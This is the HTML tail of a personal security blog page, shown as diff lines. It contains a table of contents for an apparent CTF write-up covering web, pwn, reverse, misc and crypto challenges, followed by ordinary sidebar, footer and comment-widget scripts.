+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ezpop"><span class="nav-number">1.1.</span> <span class="nav-text">Ezpop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#简单的渗透"><span class="nav-number">1.2.</span> <span class="nav-text">简单的渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#online-crt"><span class="nav-number">1.3.</span> <span class="nav-text">online_crt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cmdbrowser"><span class="nav-number">1.4.</span> <span class="nav-text">cmdbrowser</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re"><span class="nav-number">2.</span> <span class="nav-text">re</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">3.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-usb"><span class="nav-number">3.1.</span> <span class="nav-text">ez_usb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">4.</span> <span class="nav-text">pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#checksec"><span class="nav-number">5.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向"><span class="nav-number">6.</span> <span class="nav-text">逆向</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">7.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基于挑战码的双向认证"><span class="nav-number">7.1.</span> <span class="nav-text">基于挑战码的双向认证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#签到"><span class="nav-number">7.2.</span> <span class="nav-text">签到</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Str3am"
+      src="/images/Str3am.jpg">
+  <p class="site-author-name" itemprop="name">Str3am</p>
+  <div class="site-description" itemprop="description">这个人很懒，什么也没留下</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jlkl" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jlkl" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:str3am@qq.com" title="E-Mail → mailto:str3am@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://0xmj.github.io/" title="http:&#x2F;&#x2F;0xmj.github.io&#x2F;" rel="noopener" target="_blank">Mang0</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/sn1per/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sn1per&#x2F;" rel="noopener" target="_blank">Sn1per</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.siriyang.cn/" title="https:&#x2F;&#x2F;blog.siriyang.cn&#x2F;" rel="noopener" target="_blank">Siriyang</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Str3am</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="Symbols count total">421k</span>
+</div> 
+
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/moment.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment-precise-range-plugin@1.3.0/moment-precise-range.min.js"></script>
+<script>
+  function timer() {
+    var ages = moment.preciseDiff(moment(),moment(20200108,"YYYYMMDD"));
+    ages = ages.replace(/years?/, "年");
+    ages = ages.replace(/months?/, "月");
+    ages = ages.replace(/days?/, "天");
+    ages = ages.replace(/hours?/, "小时");
+    ages = ages.replace(/minutes?/, "分");
+    ages = ages.replace(/seconds?/, "秒");
+    ages = ages.replace(/\d+/g, '<span style="color:#1890ff">$&</span>');
+    div.innerHTML = `我已在此等候你 ${ages}`;
+  }
+  var div = document.createElement("div");
+  //插入到copyright之后
+  var copyright = document.querySelector(".copyright");
+  document.querySelector(".footer-inner").insertBefore(div, copyright.nextSibling);
+  timer();
+  setInterval("timer()",1000)
+</script>
+
+
+
+
+  <script async src="/js/cursor/love.min.js"></script>
+
+
+
+
+  <script src="/js/cursor/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-user"></i>
+        </span>
+        <span class="site-uv" title="我的第  undefined  位朋友，">
+          <span id="busuanzi_value_site_uv"></span>
+        </span>
+      -->
+      <span class="site-uv">
+     我的第  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_uv"></span>  位朋友，
+    </span>
+    <!--
+      <span class="post-meta-divider">|</span>
+    -->
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <!--
+        <span class="post-meta-item-icon">
+          <i class="fa fa-eye"></i>
+        </span>
+        <span class="site-pv" title="历经  undefined  次回眸才与你相遇">
+          <span id="busuanzi_value_site_pv"></span>
+        </span>
+      -->
+      <span class="site-pv">
+     历经  <span style="margin:0 5px;" class="busuanzi-value" id="busuanzi_value_site_pv"></span>  次回眸才与你相遇
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el: '#valine-comments',
+      verify: true,
+      notify: true,
+      appId: '3IVY8n0VhhMlAUHBsp34Pxx7-gzGzoHsz',
+      appKey: 'DjdjX2sAzBG2G1G5c6amlBnv',
+      placeholder: "Just go go",
+      avatar: 'mm',
+      meta: guest,
+      pageSize: '10' || 10,
+      visitor: false,
+      lang: 'en' || 'zh-cn',
+      path: location.pathname,
+      recordIP: true,
+      serverURLs: ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
